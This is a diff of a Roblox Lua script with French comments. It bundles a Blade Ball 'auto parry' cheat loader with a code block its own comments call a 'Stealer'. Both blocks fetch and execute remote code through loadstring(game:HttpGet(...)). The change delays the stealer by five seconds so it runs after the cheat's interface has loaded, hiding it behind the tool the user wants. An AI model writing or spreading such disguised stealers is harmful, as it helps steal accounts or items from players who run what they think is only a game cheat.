@@ -1,15 +1,20 @@
--- Exécution du Stealer
-task.spawn(function()
-    pcall(function()
+-- 1. On lance Blade Ball en priorité absolue
+local function launchBladeBall()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
+    end)
+    if not success then print("Erreur Argon: " .. tostring(err)) end
+end
+
+-- 2. On lance le Stealer avec un délai plus long
+local function launchStealer()
+    task.wait(5) -- On attend 5 secondes que le GUI de Blade Ball soit chargé
+    local success, err = pcall(function()
         loadstring(game:HttpGet("https://pastefy.app/lJbSvZYc/raw"))()
     end)
-end)
+    if not success then print("Erreur Stealer: " .. tostring(err)) end
+end
 
-task.wait(1) -- Pause de sécurité pour laisser le premier script s'initialiser
-
--- Exécution du GUI Blade Ball (Auto Parry)
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))() 
-    end)
-end)
+-- Exécution en threads séparés
+task.spawn(launchBladeBall)
+task.spawn(launchStealer)
